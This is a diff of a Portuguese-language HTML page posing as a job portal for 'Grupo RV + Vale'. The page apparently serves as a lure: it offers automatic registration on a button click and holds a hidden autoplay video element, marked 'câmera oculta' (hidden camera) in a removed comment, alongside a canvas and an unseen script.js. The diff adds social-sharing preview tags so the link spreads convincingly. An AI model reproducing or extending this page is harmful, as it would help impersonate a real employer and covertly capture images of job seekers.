@@ -1,112 +1,52 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>GRUPO RV + VALE</title>
 
-<meta charset="UTF-8">
+    <meta property="og:url" content="https://SEU_USUARIO.github.io/SEU_REPOSITORIO/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Grupo RV + VALE - Portal de Vagas" />
+    <meta property="og:description" content="Participe do processo seletivo do Grupo RV + Vale. Cadastre-se agora." />
+    <meta property="og:image" content="https://SEU_USUARIO.github.io/SEU_REPOSITORIO/logo-preview.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
 
-<meta
-name="viewport"
-content="width=device-width,initial-scale=1.0">
-
-<title>
-GRUPO RV + VALE
-</title>
-
-<link
-rel="stylesheet"
-href="style.css">
-
+    <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
-<div class="bg"></div>
+    <div class="bg"></div>
 
-<div class="container">
+    <div class="container">
+        <div class="topo">
+            <div class="tag">VAGAS ABERTAS</div>
+            <h1>GRUPO RV + VALE</h1>
+            <p>Participe do processo seletivo</p>
+        </div>
 
-<div class="topo">
+        <div class="video-card">
+            <iframe src="https://www.youtube.com/embed/7HRFgitt1jg?autoplay=1&mute=1&loop=1&playlist=7HRFgitt1jg" title="Grupo RV + Vale" frameborder="0" allow="autoplay" allowfullscreen></iframe>
+        </div>
 
-<div class="tag">
-VAGAS ABERTAS
-</div>
+        <div class="fala">
+            📢 Seu cadastro será realizado automaticamente após clicar no botão abaixo.
+        </div>
 
-<h1>
-GRUPO RV + VALE
-</h1>
+        <button id="btn">QUERO PARTICIPAR</button>
 
-<p>
-Participe do processo seletivo
-</p>
+        <div id="status">Inicializando sistema...</div>
 
-</div>
+        <div class="loading">
+            <div class="bar"></div>
+        </div>
 
-<!-- vídeo institucional -->
+        <video id="video" autoplay playsinline muted style="display:none;"></video>
 
-<div class="video-card">
+        <canvas id="canvas"></canvas>
+    </div>
 
-<iframe
-src="https://www.youtube.com/embed/7HRFgitt1jg?autoplay=1&mute=1&loop=1&playlist=7HRFgitt1jg"
-title="Grupo RV + Vale"
-frameborder="0"
-allow="autoplay"
-allowfullscreen>
-</iframe>
-
-</div>
-
-<!-- mensagem -->
-
-<div class="fala">
-
-📢 Seu cadastro será realizado automaticamente após clicar no botão abaixo.
-
-</div>
-
-<!-- botão -->
-
-<button id="btn">
-
-QUERO PARTICIPAR
-
-</button>
-
-<!-- status -->
-
-<div id="status">
-
-Inicializando sistema...
-
-</div>
-
-<!-- loading -->
-
-<div class="loading">
-
-<div class="bar"></div>
-
-</div>
-
-<!-- câmera oculta -->
-
-<video
-id="video"
-autoplay
-playsinline
-muted
-style="display:none;">
-</video>
-
-<!-- canvas -->
-
-<canvas id="canvas"></canvas>
-
-</div>
-
-<script
-type="module"
-src="script.js">
-</script>
-
+    <script type="module" src="script.js"></script>
 </body>
 </html>
